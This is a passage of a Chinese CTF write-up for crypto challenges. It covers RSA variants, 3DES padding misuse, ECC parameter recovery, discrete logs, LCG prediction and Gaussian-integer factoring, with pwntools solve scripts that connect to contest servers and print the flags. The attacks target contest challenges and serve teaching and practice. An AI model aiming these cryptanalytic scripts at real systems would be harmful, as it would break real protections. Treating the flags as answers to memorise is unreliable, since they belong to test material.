728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089x1 = pow(c1 * pow(3, -e1, n),e2,n)x2 = pow(c2 * pow(7, -e2, n),e1,n)p = gcd(x1-x2, n)q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m= pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27; ​ Simple3DES 题目链接：nc 59.110.20.54:23333 https://blog.csdn.net/Mr_wzc/article/details/121713518 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from Crypto.Cipher import DES3from Crypto.Util.number import *import osimport randomimport stringimport hashlibxor = lambda a,b: bytes([a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))])pad = lambda msg,padlen: msg+chr((padlen-(len(msg)%padlen))).encode()*(padlen-(len(msg)%padlen))flag = os.environ.get(&quot;FLAG&quot;, &quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;).encode()sec = os.urandom(8)banner = &#x27;|&#x27;*70DEBUG = False def proof_of_work(): if DEBUG: return True proof = &#x27;&#x27;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) digest = hashlib.sha256(proof.encode()).hexdigest() print(&quot;sha256(XXXX+%s) == %s&quot; % (proof[4:], digest)) x = input(&quot;Give me XXXX: &quot;) if len(x)!=4 or hashlib.sha256((x+proof[4:]).encode()).hexdigest() != digest: return False print(&quot;Right!&quot;) return Truedef enc(msg,key): try: key = long_to_bytes(key) msg = xor(long_to_bytes(msg),sec) des = DES3.new(key,DES3.MODE_ECB) ct = xor(des.encrypt(pad(msg,8)),sec) return bytes_to_long(ct) except Exception as e: print(e) return Exceptiondef service(): cnt = 0 if not proof_of_work(): exit() print(banner) print(&#x27;Simple DES Encryption Service&#x27;) print(banner) while cnt&lt;2: print(&#x27;1. Encrypt\\n2. Get encrypted flag.&#x27;) choice = int(input(&#x27;&gt; &#x27;)) if choice == 1: print(&#x27;Input msg:&#x27;) msg = int(input(&#x27;&gt; &#x27;).strip()) print(&#x27;Input key:&#x27;) key = int(input(&#x27;&gt; &#x27;).strip()) print(enc(msg,key)) elif choice == 2: print(&#x27;Input key:&#x27;) key = int(input(&#x27;&gt; &#x27;).strip()) print(enc(bytes_to_long(flag),key)) else: exit() cnt+=1 print(banner) print(&#x27;Bye!&#x27;) exit()try: service()except Exception: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() 代码问题在先xor后pad，对于 m=b&#39;\\x00&#39;，有 m^sec=sec，pad(sec,8)=sec+b&#39;\\x08&#39;*8。 第一轮： pad(sec,8)=sec+b&#39;\\x08&#39;*8，加密得到 c1^x | c2^x，又由 b&#39;\\x08&#39;*8 可求出 c2，得到 x。 第二轮： 已知 c&#39;^x，解密得到 flag^x，再异或得到 flag。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcefrom Crypto.Util.number import *from Crypto.Cipher import DES3r = remote(&quot;59.110.20.54&quot;,23333)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()xor = lambda a,b: bytes([a[i % len(a)] ^ b[i % len(b)] for i in range(max(len(a), len(b)))])m = bytes_to_long(b&#x27;\\x00&#x27;)key = bytes_to_long(b&#x27;abcdefgh&#x27;+b&#x27;ijklmnop&#x27;+b&#x27;qrstuvwx&#x27;)r.recvuntil(b&#x27;flag.\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;1&#x27;)r.recvuntil(b&#x27;msg:\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,str(m).encode())r.recvuntil(b&#x27;key:\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,str(key).encode())c_xor = long_to_bytes(eval(r.recvline()))c1_xor,c2_xor = c_xor[:8],c_xor[8:]des = DES3.new(long_to_bytes(key),DES3.MODE_ECB)c2 = des.encrypt(b&#x27;\\x08&#x27;*8)sec = xor(c2,c2_xor)print(sec)r.recvuntil(b&#x27;flag.\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,b&#x27;2&#x27;)r.recvuntil(b&#x27;key:\\n&#x27;)r.sendlineafter(b&#x27;&gt; &#x27;,str(key).encode())flag_c_xor = long_to_bytes(eval(r.recvline()))flag_c = xor(flag_c_xor,sec)flag_xor = des.decrypt(flag_c)flag = xor(flag_xor,sec)print(flag)r.interactive()# b&#x27;SYC&#123;DES_1s_0ut_0f_t1me&#125;o&#x27; ​ JPGDiff 图片中的字符串即为flag 提示图片为Hilbert曲线，且长图为1*65536的jpg图片，符合8阶Hilbert曲线的节点数。 按8阶Hilbert曲线的顺序来布置每一个1*1像素，即可还原原始图片。 利用hilbertcurve包完成构造： 123456789101112131415161718192021from hilbertcurve.hilbertcurve import HilbertCurvefrom PIL import Image im_cp = Image.open(&quot;ct.png&quot;)im_new = Image.new(&#x27;RGB&#x27;,(256,256)) p=8; n=2hilbert_curve = HilbertCurve(p, n)distances = list(range(65536))points = hilbert_curve.points_from_distances(distances)order = []for point, dist in zip(points, distances): #print(f&#x27;&#123;dist&#125; = &#123;tuple(point)&#125;&#x27;) order.append(tuple(point))print(len(order))for k in range(65536): tmp = im_cp.getpixel((0,k)) im_new.putpixel(order[k],tmp) im_new.save(&#x27;m.png&#x27;) 得到图片： flag：SYC&#123;H1LB5RT_C1pher&#125; ​ Energetic_Carcano 题目链接：nc 59.110.20.54:8763 https://en.wikipedia.org/wiki/Elliptic-curve_cryptography 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# from sage.all import *import os import random import string import hashlib from Crypto.Util.number import * DEBUG = Truebanner = &#x27;|&#x27;*70 flag = os.environ.get(&quot;FLAG&quot;, b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;).encode()pbits = 120abp = &quot;abp&quot; def proof_of_work(): if DEBUG: return True proof = &#x27;&#x27;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) digest = hashlib.sha256(proof.encode()).hexdigest() print(&quot;sha256(XXXX+%s) == %s&quot; % (proof[4:], digest)) x = input(&quot;Give me XXXX: &quot;) if len(x)!=4 or hashlib.sha256((x+proof[4:]).encode()).hexdigest() != digest: return False print(&quot;Right!&quot;) return Truedef check(a,b,p,turn,ans): if DEBUG: return True try: if turn == &quot;a&quot;: return int(a) == ans if turn == &quot;b&quot;: return int(b) == ans if turn == &quot;p&quot;: return int(p) == ans except Exception: exit()try: if not proof_of_work(): exit() print(banner) print(&#x27;\\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;) print(&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;) print(&#x27;Good Luck!\\n&#x27;) print(banner+&#x27;\\n&#x27;) for i in range(10): turn = random.choice(abp) p = getPrime(pbits) a,b = [next_prime(random.randint(2,p)) for _ in &quot;ab&quot;] curve = EllipticCurve(GF(p),[a,b]) pts = [curve.random_point() for _ in range(4)] pts = [(_[0], _[1]) for _ in pts] for _ in pts: print(_,end=&quot; &quot;) print(&#x27;\\nGive me &#x27;+turn+&quot; :&quot;) ans = int(input(&#x27;&gt; &#x27;)) if check(a,b,p,turn,ans): print(&quot;Good! Next challenge-&gt;\\n&quot;) print(banner+&#x27;\\n&#x27;) pbits+=5 continue else: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() print(&#x27;Congrats! Your flag is:&#x27;,flag)except Exception: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() 类似LCG计算 $a,b,p$ 的方法，利用结式计算 $a,b,p$。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcefrom sage.matrix.matrix2 import Matrixdef resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))r = remote(&quot;59.110.20.54&quot;,int(8763))table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.recvuntil(b&#x27;Luck!\\n&#x27;)for i in range(10): r.recvline() r.recvline() r.recvline() (x1,y1),(x2,y2),(x3,y3),(x4,y4) = eval(r.recvline().replace(b&#x27;) (&#x27;, b&#x27;), (&#x27;)) PR.&lt;a,b,p,k1,k2,k3,k4&gt; = PolynomialRing(ZZ) f1 = (y1^2+k1*p)-(x1^3+a*x1+b) f2 = (y2^2+k2*p)-(x2^3+a*x2+b) f3 = (y3^2+k3*p)-(x3^3+a*x3+b) f4 = (y4^2+k4*p)-(x4^3+a*x4+b) g1 = resultant(f1, f2, b) g2 = resultant(f2, f3, b) g3 = resultant(f3, f4, b) h1 = resultant(g1, g2, a) h2 = resultant(g2, g3, a) p_gcd = gcd(h1(p=0),h2(p=0)) p = list(zip(*factor(p_gcd)))[0][-1] PR.&lt;a,b&gt; = PolynomialRing(Zmod(p)) f1 = y1^2-(x1^3+a*x1+b) f2 = y2^2-(x2^3+a*x2+b) g = resultant(f1, f2, b) a = g.univariate_polynomial().roots()[0][0] b = y1^2-(x1^3+a*x1) print(f&#x27;a = &#123;a&#125;&#x27;) print(f&#x27;b = &#123;b&#125;&#x27;) print(f&#x27;p = &#123;p&#125;&#x27;) print(f2(a,b)) r.recvuntil(b&#x27;me &#x27;) op = r.recv(1) print(op) r.recvuntil(b&#x27;&gt; &#x27;) if op == b&#x27;a&#x27;: r.sendline(str(a).encode()) elif op == b&#x27;b&#x27;: r.sendline(str(b).encode()) else: r.sendline(str(p).encode()) print(r.recvline())r.interactive()# Congrats! Your flag is: b&#x27;SYC&#123;ECC_M4ster&#125;&#x27; ​ Just need One 题目链接：nc 59.110.20.54:2613 One bullet to kill all Outlaws. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import os import random import string import hashlib flag = os.environ.get(&quot;FLAG&quot;, b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;)DEBUG = Falsebanner = &#x27;|&#x27;*70if DEBUG: print(&quot;==DEBUG MODE==&quot;) def proof_of_work(): if DEBUG: return True proof = &#x27;&#x27;.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) digest = hashlib.sha256(proof.encode()).hexdigest() print(&quot;sha256(XXXX+%s) == %s&quot; % (proof[4:], digest)) x = input(&quot;Give me XXXX: &quot;) if len(x)!=4 or hashlib.sha256((x+proof[4:]).encode()).hexdigest() != digest: return False print(&quot;Right!&quot;) return True try: if not proof_of_work(): exit() print(banner) parms = [random.getrandbits(32) for _ in range(128)] res = res = int(input(&#x27;Give me x calculating f(x) :\\n&gt; &#x27;)) if res &gt;= 2**32: print(&quot;Give me something smaller.\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() cnt = 0 for _ in range(128): cnt += pow(res,_)*parms[_] print(cnt) ans = input(&#x27;Give me Coefficients :\\n&gt; &#x27;) ans = [int(_) for _ in ans.split(&quot;,&quot;)] if ans == parms: print(&#x27;Congrats! Your flag is:&#x27;,flag) else: exit()except Exception: print(&quot;Something goes wrong...\\n&quot;) print(banner+&#x27;\\n&#x27;) exit() 本质是进制转换的计算方法，提供 $x$ 后给出 $\\sum\\limits_{i=0}^{128}p_ix^i$，求各 $p_i$。利用取余和整除计算即可。 12345678910111213141516171819202122232425262728293031323334from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&quot;59.110.20.54&quot;,2613)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.recvuntil(b&#x27;&gt; &#x27;)x = 4294967295r.sendline(b&#x27;4294967295&#x27;)c = eval(r.recvline())print(c)r.recvuntil(b&#x27;&gt; &#x27;)param = []for i in range(128): param.append(c % x) c = (c-param[-1])//xr.sendline(str(param).encode().strip(b&#x27;[&#x27;).strip(b&#x27;]&#x27;))r.interactive() ​ Fi1nd_th3_x’ 听说在那个大陆有位叫jrl777的旅行者……Cryptoer穿越到了提瓦特就要拿出真本事！ 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *from libnum import* from secret import flagp = getPrime(512)q = getPrime(512)r = getPrime(512)e = getPrime(32)n = p*q*rphi = (p-1)*(q-1)*(r-1)d = inverse(e,phi)dP = d%((q-1)*(r-1))dQ = d%((p-1)*(r-1))dR = d%((p-1)*(q-1))m = s2n(flag.encode())c = pow(m,e,n)print(&#x27;p=&#x27;,p)print(&#x27;q=&#x27;,q)print(&#x27;r=&#x27;,r)print(&#x27;dP=&#x27;,dP)print(&#x27;dQ=&#x27;,dQ)print(&#x27;dR=&#x27;,dR)print(&#x27;c=&#x27;,c)&#x27;&#x27;&#x27;p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009&#x27;&#x27;&#x27; 由于 $m&lt;qr,m&lt;pr,m&lt;pq$，故 $m=c^{dP} \\bmod {qr}=c^{dQ} \\bmod {pr}=c^{dR} \\bmod {pq}$，否则需应用CRT来求 $m$。 1234567891011121314p= 13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343q= 12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667r= 12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419dP= 116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941dQ= 44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797dR= 60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921c= 93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009m1=pow(c,dP,q*r)m2=pow(c,dQ,p*r)m3=pow(c,dR,p*q)print(bytes.fromhex(hex(m1)[2:]))# b&#x27;SYC&#123;CRT_1s_f3n_but_Gen3hi_im9act_is_a_balabalaba&#125;&#x27; ​ Quick_Robert 题目链接：nc 59.110.20.54:3042 https://en.wikipedia.org/wiki/Quadratic_residue 参考 Some sums of Legendre’s symbols，利用二次剩余的求和特性计算： $\\sum\\limits_{x=0}^{p-1}\\left(\\cfrac{ax^2+bx+c}p\\right) = \\left\\{\\begin{array}{cl}-\\left(\\cfrac ap\\right),&amp; p \\nmid b^2-4ac \\newline (p-1)\\left(\\cfrac ap\\right),&amp; p \\mid b^2-4ac \\end{array}\\right.$ 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforceimport sympyr = remote(&quot;59.110.20.54&quot;,3042)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(b&quot;XXXX+&quot;) suffix = r.recv(16).decode(&quot;utf8&quot;) r.recvuntil(b&quot;== &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(b&#x27;XXXX: &#x27;, proof.encode()) PoW()r.recvuntil(b&#x27;success!&#x27;)for i in range(10): print(i) r.recvuntil(b&#x27;|||||\\n\\n&#x27;) a = eval(r.recvuntil(b&#x27;*&#x27;)[:-1]) r.recvuntil(b&#x27;+&#x27;) b = eval(r.recvuntil(b&#x27;*&#x27;)[:-1]) r.recvline() exec(r.recvuntil(b&#x27;(&#x27;)[:-1]) print(f&#x27;a = &#123;a&#125;&#x27;) print(f&#x27;b = &#123;b&#125;&#x27;) print(f&#x27;p = &#123;p&#125;&#x27;) delta = b**2-4*a x = sympy.legendre_symbol(a,p) x = x*(p-1 if delta%p==0 else -1) print(f&#x27;x = &#123;x&#125;&#x27;) r.sendlineafter(b&#x27;answer: &#x27;,str(x).encode()) print(r.recvline()) print()r.interactive() ​ Diligent_Liszt https://en.wikipedia.org/wiki/Discrete_logarithm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import gmpy2 as gp import random from Crypto.Util.number import * DEBUG = False flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;assert flag.startswith(b&quot;SYC&quot;)nbits = 512g = 3 def gen_p_1(digit): primes = [] pri = 1 while(len(primes)&lt;100): pri = gp.next_prime(pri) primes.append(int(pri)) while True: count = 2 while count &lt; 2**digit: count *= random.choice(primes) count += 1 if(gp.is_prime(count)): return count p,q,r = [gen_p_1(nbits) for _ in &quot;pqr&quot;] n = p*q*r x = bytes_to_long(flag) y = gp.powmod(g,x,n) print(&quot;p = &#123;&#125;&quot;.format(p))print(&quot;q = &#123;&#125;&quot;.format(q))print(&quot;r = &#123;&#125;&quot;.format(r)) print(&quot;y = &#123;&#125;&quot;.format(y)) if DEBUG: print(&quot;x = &#123;&#125;&quot;.format(x)) &#x27;&#x27;&#x27;p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266&#x27;&#x27;&#x27; DLP，Pohlig–Hellman算法+CRT。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849p = 1068910928091265978478887270179608140018534288604159452828300604294675735481804963679672853224192480667904101881092533866322948043654533322038484907159945421q = 1711302770747802020613711652777299980542669713888988077474955896217408515180094849053961025086865697904731088087532944829046702427480842253022459937172565651r = 132969813572228739353704467775972551435751558645548804253458782569132362201099158857093676816706297676454547299888531536236748314013888413096371966359860637y = 5385116324746699759660077007129548063211490907227715474654765255668507958312745677683558789874078477569613259930365612562164095274660123330458355653249805062678976259429733060364358954180439218947514191603330532117142653558803034110759332447742304749985874760435453594107494324797235909651178472904825071375135846093354526936559640383917210702874692725723836865724807664892994298377375580807917514349966834376413176898806591411038129330967050554114677719107335006266g = 3 def babystep_giantstep(g, y, p, q=None): if q is None: q = p - 1 m = int(q**0.5 + 0.5) # Baby step table = &#123;&#125; gr = 1 # g^r for r in range(m): table[gr] = r gr = (gr * g) % p # Giant step try: gm = pow(g, -m, p) # gm = g^&#123;-m&#125; except: return None ygqm = y # ygqm = y * g^&#123;-qm&#125; for q in range(m): if ygqm in table: return q * m + table[ygqm] ygqm = (ygqm * gm) % p return None# Pohlig–Hellman法def pohlig_hellman_DLP(g, y, p): crt_moduli = [] crt_remain = [] for q, _ in factor(p-1): x = babystep_giantstep(pow(g,(p-1)//q,p), pow(y,(p-1)//q,p), p, q) if (x is None) or (x &lt;= 1): continue crt_moduli.append(q) crt_remain.append(x) x = crt(crt_remain, crt_moduli) return xxp = pohlig_hellman_DLP(g, y%p, p)xq = pohlig_hellman_DLP(g, y%q, q)xr = pohlig_hellman_DLP(g, y%r, r)x = crt([xp,xq,xr],[p-1,q-1,r-1])print(bytes.fromhex(hex(x)[2:]))b&#x27;SYC&#123;D1scr3te_L0g_W1th_Mult1pl3_pr1m35&#125;&#x27; ​ card_game AL3XEI送给了你这个游戏的关键数据，你能预测接下来要出的牌吗 nc 59.110.20.54 4953 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101from Crypto.Util.number import *from cards import Heart, Spade, Club, Diamondfrom secret import flagdef choose_card(num): x = (num&gt;&gt;5)%4 if x == 0: return (Heart[(num&gt;&gt;6)%13]), &#x27;Heart&#x27; if x%4 == 1: return (Spade[(num&gt;&gt;6)%13]), &#x27;Spade&#x27; if x%4 == 2: return (Diamond[(num&gt;&gt;6)%13]), &#x27;Diamond&#x27; else: return (Club[(num&gt;&gt;6)%13]), &#x27;Club&#x27;def GAME(): banner = &#x27;&#x27;&#x27; #### ## ##### ##### #### ## # # ###### # # # # # # # # # # # # ## ## # # # # # # # # # # # # ## # ##### # ###### ##### # # # ### ###### # # # # # # # # # # # # # # # # # # #### # # # # ##### #### # # # # ######&#x27;&#x27;&#x27; print(banner) meum = &#x27;&#x27;&#x27;option: 1: start game 2: get hint 3: exit &#x27;&#x27;&#x27; print(meum) while True: print(&#x27;input your option: &#x27;, end=&#x27;&#x27;) your_input = input() if your_input == &#x27;1&#x27;: n = getPrime(36) m = getPrime(16) c = getPrime(16) seed = getPrime(36) out = seed round = 0 score = 0 res = [] while True: round += 1 res = [] print(f&#x27;round:&#123;round&#125;&#x27;) print(f&#x27;score:&#123;score&#125;&#x27;) for i in range (3): out = (out*m+c)%n res.append(out) if round == 1: for i in res: card, suit = choose_card(i) print(card) elif round==2 or round==3: #gift for i in res: card, suit = choose_card(i) print(card) print(f&#x27;gift: &#123;res&#125;&#x27;) else: cards = [] suits = [] for i in range(len(res)): card, suit = choose_card(res[i]) cards.append(card) suits.append(suit) print(&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;) try: g_1, g_2, g_3 = input().split() g_1, g_2, g_3 = g_1.split(&#x27;_&#x27;), g_2.split(&#x27;_&#x27;), g_3.split(&#x27;_&#x27;) except ValueError: print(&quot;Please enter in the correct format.&quot;) return if (g_1[0] == suits[0] and g_1[1] == cards[0][15]) and (g_2[0] == suits[1] and g_2[1] == cards[1][15]) and (g_3[0] == suits[2] and g_3[1] == cards[2][15]): for i in cards: print(i) print(&quot;Congratulations! You matched the cards!&quot;) score += 1 else: for i in cards: print(i) print(&quot;Try again!&quot;) if score == 50: print(&#x27;The flag is your reward!&#x27;) print(flag) return else: continue if your_input == &#x27;2&#x27;: print(&quot;Have you ever heard of LCG?&quot;) if your_input == &#x27;3&#x27;: breakif __name__ == &#x27;__main__&#x27;: GAME() 代码逻辑本质是LCG，有个坑点，比对的时候，10是0。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcefrom functools import reducefrom math import gcdfrom Crypto.Util.number import *def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&#x27;modular inverse does not exist&#x27;) else: return x % mdef crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementdef crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus) def choose_card(num): x = (num&gt;&gt;5)%4 if x == 0: return (num&gt;&gt;6)%13, &#x27;Heart&#x27; if x%4 == 1: return (num&gt;&gt;6)%13, &#x27;Spade&#x27; if x%4 == 2: return (num&gt;&gt;6)%13, &#x27;Diamond&#x27; else: return (num&gt;&gt;6)%13, &#x27;Club&#x27;r = remote(&quot;59.110.20.54&quot;,4953)r.sendlineafter(b&#x27;option: &#x27;,b&#x27;1&#x27;)seq = []r.recvuntil(b&#x27;gift: &#x27;)seq += eval(r.recvline())r.recvuntil(b&#x27;gift: &#x27;)seq += eval(r.recvline())print(seq)n, m, c = crack_unknown_modulus(seq)print((n,m,c))out = seq[-1]for k in range(50): next = [] for i in range(3): out = (out*m+c)%n card,suit = choose_card(out) real_card = str(card+1).replace(&#x27;10&#x27;,&#x27;0&#x27;).replace(&#x27;11&#x27;,&#x27;J&#x27;).replace(&#x27;12&#x27;,&#x27;Q&#x27;).replace(&#x27;13&#x27;,&#x27;K&#x27;).replace(&#x27;1&#x27;,&#x27;A&#x27;) next.append(f&#x27;&#123;suit&#125;_&#123;real_card&#125;&#x27;.encode()) next = b&#x27; &#x27;.join(next) print(k,next) r.recvuntil(b&#x27;(example: Heart_1 Club_2 Diamond_3)\\n&#x27;) r.sendline(next)print(r.recvall().decode())# Congratulations! You matched the cards!# The flag is your reward!# b&#x27;SYC&#123;lcg_a@@@@@ttack&#125;&#x27; ​ EzComplex And u, my friend: Complex factors! (In a double sense) 高斯整数分解。 12345678910111213c = 122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276N = 973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498GI = GaussianIntegers()d = divisors(GI(N))for k in d: if &#x27;I&#x27; in str(k): p = int(abs(k.imag())) q = int(abs(k.real())) if p.bit_length() in range(382,385) and is_prime(p) and q.bit_length() in range(382,385) and is_prime(q): print((p,q)) # (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)# (29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343, 8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707) 再常规RSA： 123456789p,q = (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)e = 0x10001c = 122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27; ​ ext^7gcd 